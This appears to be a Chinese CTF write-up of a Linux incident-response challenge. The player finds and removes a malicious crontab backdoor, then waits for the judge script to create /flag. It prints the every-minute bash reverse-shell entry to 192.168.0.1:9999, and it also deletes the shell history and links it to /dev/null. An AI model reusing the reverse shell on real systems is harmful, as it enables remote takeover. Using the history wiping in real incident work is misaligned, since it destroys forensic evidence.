# 服务后门排查 WP

## 一、题目概述

本题的正式题名为 **服务后门排查**。根据题目截图可知，题面明确说明某公司服务器被攻击者写入了**定时任务**，系统会周期性执行恶意行为；参赛者需要完成处置，并在环境恢复正常后读取根目录下的 `flag`。题目提供的是一个基于 Web 的终端入口，登录账号和密码均为 `ctf`。

这道题并不是传统意义上的漏洞利用题，而是非常典型的 **Linux 应急响应 / 持久化后门排查题**。真正的核心不在于提权，而在于识别攻击者留下的持久化机制，完成最小必要修复，然后等待裁判逻辑确认环境已恢复正常，自动生成 `/flag`。

我先根据题目截图与登录后环境信息，对本题的基础画像进行梳理。

从题面关键字“**定时任务**”出发，本题的第一优先排查对象就应当是 `crontab`、`/etc/crontabs/`、`/var/spool/cron/` 等计划任务落点，而不是急于搜索 WebShell、系统服务单元或启动脚本。也正因为题面已经给出了较强方向提示，所以这题考察的是参赛者能否把题面语义准确映射到系统排查路径上。

## 三、初始排查与异常定位

进入环境后，首先确认当前身份和关键文件状态，并查看计划任务配置。首轮取证结果显示，当前用户为 `ctf`，同时系统内存在明显异常的用户级计划任务。对应现象如下。

| 检查项 | 结果 | 结论 |
| --- | --- | --- |
| `whoami` | `ctf` | 当前仅具备普通用户权限 |
| `crontab -l` | 存在每分钟执行的 Bash 反连任务 | 明显为恶意持久化 |
| `/etc/crontabs/ctf` | 与当前 crontab 内容一致 | 恶意任务已被写入默认计划任务文件 |
| `/home/ctf/.ash_history` | 存在且可写 | 可能保留攻击/处置痕迹 |
| `/readflag` | 存在但不可被 `ctf` 直接使用 | 属于干扰项或裁判配套文件 |
| `/flag` | 初始不存在 | 需要等待裁判生成 |

最关键的恶意计划任务内容为：

```text
* * * * * /bin/bash -i >& /dev/tcp/192.168.0.1/9999 0>&1
```

这条语句的含义非常明确。它会让 `bash` 以交互方式向 `192.168.0.1:9999` 发起反向连接，并将标准输入、标准输出、标准错误全部重定向到该 TCP 连接上，从而形成一个**每分钟自动回连一次**的反弹 Shell 持久化点。

从应急响应视角看，这已经足以判定环境被植入了恶意后门。因为正常业务任务几乎不可能以这种形式通过 `/dev/tcp/` 建立隐蔽远程控制通道，而题面又明确提到“被写入定时任务、定时执行恶意行为”，与该异常完全吻合。

## 四、证据链分析

为了避免只看到一个表面异常点，我继续比对了用户 crontab 和默认计划任务文件。结果显示，`crontab -l` 与 `/etc/crontabs/ctf` 中的内容完全一致，说明攻击者并不是临时创建了一个一次性任务，而是把恶意计划任务稳定地落到了当前用户对应的 crontab 配置中。

| 证据编号 | 证据内容 | 证明作用 |
| --- | --- | --- |
| 1 | 题面直接指出服务器被写入定时任务 | 明确排查方向应聚焦计划任务体系 |
| 2 | `crontab -l` 出现 Bash 反连任务 | 证明恶意任务处于激活状态 |
| 3 | `/etc/crontabs/ctf` 中同样存在该任务 | 证明异常已固化进用户计划任务配置 |
| 4 | `/home/ctf/.ash_history` 可写且持续记录命令 | 说明处置痕迹本身也可能影响判题 |
| 5 | 初始没有 `/flag`，清理完成后才出现 `/flag` | 说明题目依赖异步裁判逻辑放旗 |

在这里有一个非常重要的判断：本题并不要求参赛者强行执行 `/readflag`，也不要求通过漏洞链拿到 root。因为 `/readflag` 的权限为 `-r-x------`，对 `ctf` 用户不可直接调用，而 `/flag` 在初始状态下又不存在。因此更加合理的解释是：**裁判脚本会在检测到环境已恢复后，主动在根目录生成一个可读取的 `/flag` 文件**。

## 五、处置思路

本题最稳妥的处置策略是遵循 **最小改动原则**。也就是说，只清理题面明确要求的恶意计划任务与相关痕迹，而不去破坏系统中其他无关组件。

整体思路可以概括为两个层面。第一层面是移除恶意持久化，即清空当前用户的 crontab，使那条每分钟执行的 Bash 反连任务不再触发。第二层面是尽量降低交互过程对历史文件的污染，避免裁判脚本在检查环境时因为残留痕迹而判定修复不彻底。

| 处置阶段 | 目标 | 具体做法 |
| --- | --- | --- |
| 计划任务清理 | 取消恶意回连 | 把当前用户 crontab 置空 |
| 历史痕迹处理 | 避免命令继续写入历史 | 删除 `.ash_history` 并将其指向 `/dev/null` |
| 判题等待 | 等待环境异步恢复 | 睡眠一段时间后检查 `/flag` |

这里之所以把历史文件一起处理，是因为在实际操作中可以观察到，`/home/ctf/.ash_history` 会持续记录登录后的命令。如果裁判逻辑对处置痕迹有额外检查，或者题目希望选手顺带完成“清痕”，那么仅删除恶意 crontab 可能还不够稳妥。

## 六、实际处置过程

在新的实例中，我将最终修复动作整合为一组连续命令，尽量一次完成，以减少额外交互带来的变量。实际执行思路如下。

```bash
rm -f /home/ctf/.ash_history
ln -sf /dev/null /home/ctf/.ash_history
printf '' >/tmp/emptycron
crontab /tmp/emptycron
sleep 150
ls -la /flag /home/ctf/.ash_history
cat /flag
```

这几条命令分别完成了如下工作。

| 命令 | 作用 |
| --- | --- |
| `rm -f /home/ctf/.ash_history` | 删除已有历史文件，清除先前命令记录 |
| `ln -sf /dev/null /home/ctf/.ash_history` | 让后续历史写入落空，避免继续污染 |
| `printf '' >/tmp/emptycron` | 生成空的 crontab 文件 |
| `crontab /tmp/emptycron` | 用空配置覆盖当前用户的恶意计划任务 |
| `sleep 150` | 预留足够时间给裁判脚本轮询状态 |
| `ls -la /flag` / `cat /flag` | 检查并读取最终 flag |

修复完成后，再次核查环境状态，可以看到 `.ash_history` 已变为指向 `/dev/null` 的符号链接，当前用户 `crontab -l` 不再输出任何任务内容，而根目录中成功出现了 `/flag` 文件。

| 修复后检查项 | 结果 |
| --- | --- |
| `/home/ctf/.ash_history` | `-> /dev/null` |
| `crontab -l` | 空 |
| `/flag` | 已生成，权限可读 |

这说明题目并未要求真正夺取 root 权限，而是要求**把恶意定时任务清理到裁判认可的状态**。一旦环境符合预期，裁判便会主动把 flag 写入根目录。

## 八、题目本质总结

这道题本质上考察的是 **Linux 用户级计划任务后门排查与处置**。题目把恶意持久化点设计得并不隐蔽，核心难点不在于“找到反连一句话木马”本身，而在于理解整个判题闭环：攻击者通过 `crontab` 实现周期性回连，参赛者需要最小化清理异常配置，并等待裁判异步确认环境恢复。

从训练角度看，这题覆盖了三个非常实用的能力点。首先，参赛者需要能够根据题面中的“定时任务”快速收敛排查面。其次，参赛者需要识别 `bash -i >& /dev/tcp/...` 这种典型反弹 Shell 语句的危险性。最后，参赛者还要理解很多应急响应题的真正过关条件并不是“我已经看到 flag 文件”，而是“我已经把系统恢复到裁判认可的安全状态”。

也正因为如此，这题最准确的解法表述应当是：**确认恶意 crontab 为 Bash 反连后门，清空当前用户计划任务，处理命令历史痕迹，等待裁判脚本生成 `/flag`，然后读取最终答案。**
